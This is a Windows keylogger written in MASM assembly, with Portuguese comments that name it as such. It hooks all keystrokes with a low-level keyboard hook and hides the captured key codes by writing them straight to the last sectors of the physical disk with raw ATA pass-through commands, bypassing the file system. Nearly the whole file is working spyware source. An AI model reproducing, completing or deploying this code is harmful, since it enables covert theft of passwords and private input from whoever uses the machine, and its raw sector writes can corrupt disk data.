;WINDOWS KEYLOGGER COM A SETWINDOWSHOOKEX API. EM WIKILEAKS.ORG
;ESCRITO POR MIM, O PROGRAMADOR BRUNO GUIMAR�ES SALVADOR. EM MICROSOFT MACRO ASSEMBLER
.386
.model flat,stdcall
option casemap:none
include c:\masm\include\windows.inc
include c:\masm\include\kernel32.inc
include c:\masm\include\user32.inc
includelib c:\masm\lib\kernel32.lib
includelib c:\masm\lib\user32.lib
include     c:\masm\include\advapi32.inc
include     c:\masm\include\msvcrt.inc
includelib     c:\masm\lib\msvcrt.lib
includelib     c:\masm\lib\advapi32.lib

fopen         PROTO C :dword ,:dword
fwrite         PROTO C :dword ,:dword, :dword ,:dword
fclose         PROTO C :dword
strcat        PROTO C :dword,:dword

.data
buffer      DB 1
SCANCODE		db	0
TotalOfSectors	dd	0
CurrentSector	dd	0
hDevice			dd	0
NIL				dd	0
IsLBA48			dd	0
written			dd	0
High1			dd	0						
MAXBUF			dd	0						
Counter			dd	0
Counter2		dd	0
KEYSTROKES		db	512	dup	(0)
fp				dd 0
filemode		db "a",0
hhook      HHOOK 0
kbhook     KBDLLHOOKSTRUCT <>
msg         MSG <>
kbptr      DWORD 0
username        db    255 dup (0)

_urlTmp 		db 2048 dup (0)
IDENTIFY_DEVICE_DATA STRUC 
 	GeneralConfiguration		dw ? 
 	NumCylinders			dw ? 
 	ReservedWord2			dw ? 
 	NumHeads			dw ? 
 	Retired1			dw 2 dup (?) 
 	NumSectorsPerTrack		dw ? 
 	VendorUnique1			dw 3 dup (?) 
 	SerialNumber			db 20 dup (?) 
 	Retired2			dw 2 dup (?) 
 	Obsolete1			dw ? 
 	FirmwareRevision		db 8 dup (?) 
 	ModelNumber			db 40 dup (?) 
 	MaximumBlockTransfer		db ? 
 	VendorUnique2			db ? 
 	ReservedWord48			dw ? 
 	Capabilities			dd ? 
 	ObsoleteWords51 		dw 2 dup (?) 
 	TranslationFieldsValid		dw ? 
 	NumberOfCurrentCylinders	dw ? 
 	NumberOfCurrentHeads		dw ? 
 	CurrentSectorsPerTrack		dw ? 
 	CurrentSectorCapacity		dd ? 
 	CurrentMultiSectorSetting	db ? 
 	MultiSectorSettingValid 	db ? 
 	UserAddressableSectors		dd ? 
 	ObsoleteWord62			dw ? 
 	MultiWordDMASupport		db ? 
 	MultiWordDMAActive		db ? 
 	AdvancedPIOModes		db ? 
 	ReservedByte64			db ? 
 	MinimumMWXferCycleTime		dw ? 
 	RecommendedMWXferCycleTime	dw ? 
 	MinimumPIOCycleTime		dw ? 
 	MinimumPIOCycleTimeIORDY	dw ? 
 	ReservedWords69 		dw 6 dup (?) 
 	QueueDepth			dw ? 
 	ReservedWords76 		dw 4 dup (?) 
 	MajorRevision			dw ? 
 	MinorRevision			dw ?	 
 	CommandSetSupport		dw 3 dup (?) 
 	CommandSetActive		dw 3 dup (?) 
 	UltraDMASupport 		db ? 
 	UltraDMAActive			db ? 
 	ReservedWord89			dw 4 dup (?) 
 	HardwareResetResult		dw ? 
 	CurrentAcousticValue		db ? 
 	RecommendedAcousticValue	db ? 
 	ReservedWord95			dw 5 dup (?) 
	Max48BitLBA			dq ? 
 	StreamingTransferTime		dw ? 
 	ReservedWord105 		dw ? 
 	PhysicalLogicalSectorSize	dw ? 
 	InterSeekDelay			dw ? 
 	WorldWideName			dw 4 dup (?) 
 	ReservedForWorldWideName128	dw 4 dup (?) 
 	ReservedForTlcTechnicalReport	dw ? 
 	WordsPerLogicalSector		dw 2 dup (?) 
 	CommandSetSupportExt		dw ? 
 	CommandSetActiveExt		dw ? 
 	ReservedForExpandedSupportandActive	dw 6 dup (?) 
	MsnSupport			dw ? 
 	SecurityStatus			dw ? 
 	ReservedWord129 		dw 31 dup (?) 
	CfaPowerModel			dw ? 
 	ReservedForCfaWord161		dw 8 dup (?) 
 	DataSetManagementFeature	dw ? 
 	ReservedForCfaWord170		dw 6 dup (?) 
 	CurrentMediaSerialNumber	dw 30 dup (?) 
 	ReservedWord206 		dw ? 
 	ReservedWord207 		dw 2 dup (?) 
 	BlockAlignment			dw ? 
 	WriteReadVerifySectorCountMode3Only	dw 2 dup (?) 
 	WriteReadVerifySectorCountMode2Only	dw 2 dup (?) 
 	NVCacheCapabilities		dw ? 
 	NVCacheSizeLSW			dw ? 
 	NVCacheSizeMSW			dw ? 
 	NominalMediaRotationRate	dw ? 
 	ReservedWord218 		dw ? 
 	NVCacheEstimatedTimeToSpinUpInSeconds	dw ? 
 	Reserved			dw ? 
 	ReservedWord220 		dw 35 dup (?) 
 	Signature			db ? 
 	CheckSum			db ? 
 IDENTIFY_DEVICE_DATA ENDS
 
 IdentificaDrive IDENTIFY_DEVICE_DATA <>

ATA_STRUCT1 STRUC DWORD
	Features	BYTE ?
	Count   	BYTE ?
	Number		BYTE ?
	Cylinder	BYTE ?
	CylinderH	BYTE ?
	Device_Head	BYTE ?
	Command		BYTE ?
	Reserved	BYTE ?
	ATA_STRUCT1 ENDS     
	ATA_STRUCT2 STRUCT DWORD
	Features	BYTE ?
	Count   	BYTE ?
	Number		BYTE ?
	Cylinder	BYTE ?
	CylinderH	BYTE ?
	Device_Head	BYTE ?
	Command		BYTE ?
	Reserved	BYTE ?
	ATA_STRUCT2 ENDS     			
	ATA_PASS_THRU STRUCT DWORD
	Length1				WORD  ?
	AtaFlags			WORD  ?
	PathId				BYTE  ? 
	TargetId			BYTE  ?
	Lun				BYTE  ?
	Reserved1			BYTE  ?
	DataTransferLength		DWORD  ?
	TimeOutValue			DWORD  ?
	Reserved2			DWORD  ?
	DATABUFFEROFFSET		DWORD  ?
	align 8
	Ata1				ATA_STRUCT1 <>
	align 8
	Ata2				ATA_STRUCT2 <>
	ATA_PASS_THRU ENDS
	PTE1 ATA_PASS_THRU <>
	BUF DB 1024 DUP (0)
	Text			dd  0,0
PHYSICALDRIVE1 	db  "\\.\PhysicalDrive0",0 
.CODE
main:

lea     edx, LowLevelKeyboardProc
invoke  SetWindowsHookEx, WH_KEYBOARD_LL, edx, 0, 0
mov     [hhook], eax
CALL Q0
messageproc:
    invoke  GetMessage, addr msg, NULL, 0, 0
    cmp     eax, TRUE
    jz      processmsg
    invoke  UnhookWindowsHookEx, [hhook]
    invoke  ExitProcess, 0
    processmsg:
        invoke  TranslateMessage, addr msg
        invoke  DispatchMessage, addr msg
        jmp messageproc

LowLevelKeyboardProc:
    cmp     dword ptr[esp+4], 00h
    jae     processhook
    return:
        invoke  CallNextHookEx, 0, dword ptr[esp+4], dword ptr[esp+8], dword ptr[esp+0Ch]
        retn
    processhook:
        cmp     dword ptr[esp+8], WM_KEYDOWN
        jnz     return
        mov     ebx, [esp+0Ch]
        mov     ebx, [ebx+04h]
	CALL Q1
	JMP return
Q0:
CALL IDENTIFYDEVICE
MOV EBX,SIZEOF ATA_PASS_THRU		
LEA EDX,[PTE1+EBX]
ADD EDX,[IDENTIFY_DEVICE_DATA.Max48BitLBA]
MOV EDI,[EDX]
MOV EAX,[EDX]
LEA EDX,[PTE1+EBX]
ADD EDX,[IDENTIFY_DEVICE_DATA.UserAddressableSectors]
MOV EBX,[EDX]
CMP EBX,EAX
JZ LBA28
MOV [IsLBA48],1
JMP LBA48
LBA28:
MOV [IsLBA48],0
LBA48:


MOV ESI,EDI
MOV TotalOfSectors,ESI
MOV EDI,TotalOfSectors
SUB EDI,3
MOV TotalOfSectors,EDI
MOV EAX,10
MOV EBX,TotalOfSectors
SUB EBX,EAX
MOV MAXBUF,EBX
MOV Counter2,0
LEA EDI,[PTE1]
MOV ECX,512
MOV EAX,0
REP STOSB
ret

Q1:
mov     byte ptr[buffer],bl
MOV ECX,Counter		;CHECA SE J� PODE GRAVAR NO PROXIMO SETOR DO DRIVE
CMP ECX,512
JZ Q2
mov al,byte ptr[buffer]
MOV BYTE PTR[PTE1+28h+ECX],AL	;GUARDA A ULTIMA TECLA NO BUFFER
INC Counter
INC Counter2

WriteBuf:
CMP [IsLBA48],0
JZ L28
CALL WritePhysicalSector48	;SE A CONTROLADORA DO DRIVE FOR DE 48-BIT GRAVA O BYTE DO VIRTUAL KEY CODE COM LBA48
JMP L48
L28:
CALL WritePhysicalSector28   ;SE A CONTROLADORA DO DRIVE FOR DE 28-BIT GRAVA O BYTE DO VIRTUAL KEY CODE COM LBA28
L48:
JMP return
Q2:
MOV EDI,TotalOfSectors		;SE J� TIVER ENCHIDO OS 512 BYTES DO SETOR DECREMENTA O ENDERE�O DO SETOR
DEC EDI
MOV TotalOfSectors,EDI
MOV Counter,0
LEA EDI,[PTE1+28h]			;E ZERA O BUFFER ANTIGO
MOV ECX,512
MOV EAX,0
REP STOSB
FINAL:
RET

;##################################################################################
IDENTIFYDEVICE PROC NEAR
push 0
push 0
push 3
push 0
push 3
push GENERIC_ALL
push offset PHYSICALDRIVE1
call CreateFileA
MOV hDevice,EAX	
MOV EAX,28h
MOV PTE1.Length1,AX

MOV EAX,0Ah
MOV PTE1.TimeOutValue,EAX

MOV EAX,200h
MOV PTE1.DataTransferLength,EAX

MOV EAX,[SIZEOF ATA_PASS_THRU]
MOV PTE1.DATABUFFEROFFSET,EAX
MOV BL,0
MOV AL,0ECh
MOV PTE1.Ata2.Command,AL			;IMPORTANTE: EFETUA O COMANDO IDENTIFY DEVICE PARA OBTER TODAS AS INFORMA��ES DO DRIVE

MOV AL,0
MOV PTE1.Ata2.Count,AL
MOV BL,0
MOV AL,BL

OR AL,0E0h
MOV PTE1.Ata2.Device_Head,AL

MOV AX,3h
MOV PTE1.AtaFlags,AX

mov ebx,0
mov al,bl
MOV AL,0
MOV PTE1.Ata2.Number,AL
MOV PTE1.Ata2.Cylinder,AL
MOV PTE1.Ata2.CylinderH,AL
push 0
push offset NIL
push 228h
push offset PTE1
push 228h
push offset PTE1
push 4D02Ch
push hDevice
call DeviceIoControl

push hDevice
call CloseHandle

RET
IDENTIFYDEVICE ENDP
;##################################################################################
WritePhysicalSector48 PROC NEAR

push 0
push 0
push 3
push 0
push 3
push GENERIC_ALL
push offset PHYSICALDRIVE1
call CreateFileA
MOV [hDevice],EAX

MOV EAX,28h
MOV PTE1.Length1,AX

MOV EAX,0Ah
MOV PTE1.TimeOutValue,EAX

MOV EAX,512
MOV PTE1.DataTransferLength,EAX

MOV EAX,SIZEOF ATA_PASS_THRU
MOV PTE1.DATABUFFEROFFSET,EAX

MOV AL,1
MOV PTE1.Ata2.Count,AL
MOV BL,0
MOV AL,BL

MOV EBX,TotalOfSectors
and ebx,0FFh
mov al,bl
MOV PTE1.Ata2.Number,AL

MOV EBX,TotalOfSectors
and ebx,0ff00h
shr ebx,8
mov al,bl
MOV PTE1.Ata2.Cylinder,AL


MOV EBX,TotalOfSectors
and ebx,0ff0000h
shr ebx,16
mov al,bl
MOV PTE1.Ata2.CylinderH,AL

MOV EBX,TotalOfSectors
mov bl,0
mov al,bl
OR AL,0E0h
MOV PTE1.Ata2.Device_Head,AL

MOV EBX,TotalOfSectors
and ebx,0ff000000h
shr ebx,24
mov al,bl
MOV PTE1.Ata1.Number,AL

mov al,0
MOV PTE1.Ata1.CylinderH,AL

mov al,0
MOV PTE1.Ata1.Cylinder,AL

MOV AL,034h
MOV PTE1.Ata2.Command,AL			;IMPORTANTE: COMANDO ATA 30H: ESCREVE SETOR(ES)

MOV AX,12
MOV PTE1.AtaFlags,AX

push 0
push offset NIL
push 228h
push offset PTE1
push 228h
push offset PTE1
push 4D02Ch
push hDevice
call DeviceIoControl

push hDevice
call CloseHandle
ret

WritePhysicalSector48 ENDP
;##################################################################################
WritePhysicalSector28 PROC NEAR

push 0
push 0
push 3
push 0
push 3
push GENERIC_ALL
push offset PHYSICALDRIVE1
call CreateFileA
MOV [hDevice],EAX

MOV EAX,28h
MOV PTE1.Length1,AX

MOV EAX,0Ah
MOV PTE1.TimeOutValue,EAX

MOV EAX,512
MOV PTE1.DataTransferLength,EAX

MOV EAX,SIZEOF ATA_PASS_THRU
MOV PTE1.DATABUFFEROFFSET,EAX

MOV AL,1
MOV PTE1.Ata2.Count,AL
MOV BL,0
MOV AL,BL

MOV EBX,TotalOfSectors
and ebx,0FFh
mov al,bl
MOV PTE1.Ata2.Number,AL

MOV EBX,TotalOfSectors
and ebx,0ff00h
shr ebx,8
mov al,bl
MOV PTE1.Ata2.Cylinder,AL


MOV EBX,TotalOfSectors
and ebx,0ff0000h
shr ebx,16
mov al,bl
MOV PTE1.Ata2.CylinderH,AL

MOV EBX,TotalOfSectors
and ebx,0ff000000h
shr ebx,24
MOV AL,BL
OR AL,0E0h
MOV PTE1.Ata2.Device_Head,AL

MOV AL,030h
MOV PTE1.Ata2.Command,AL			;IMPORTANTE: COMANDO ATA 30H: ESCREVE SETOR(ES)

MOV AX,4
MOV PTE1.AtaFlags,AX

	
push 0
push offset NIL
push 228h
push offset PTE1
push 228h
push offset PTE1
push 4D02Ch
push hDevice
call DeviceIoControl

push hDevice
call CloseHandle
ret

WritePhysicalSector28 ENDP
;##################################################################################
END main 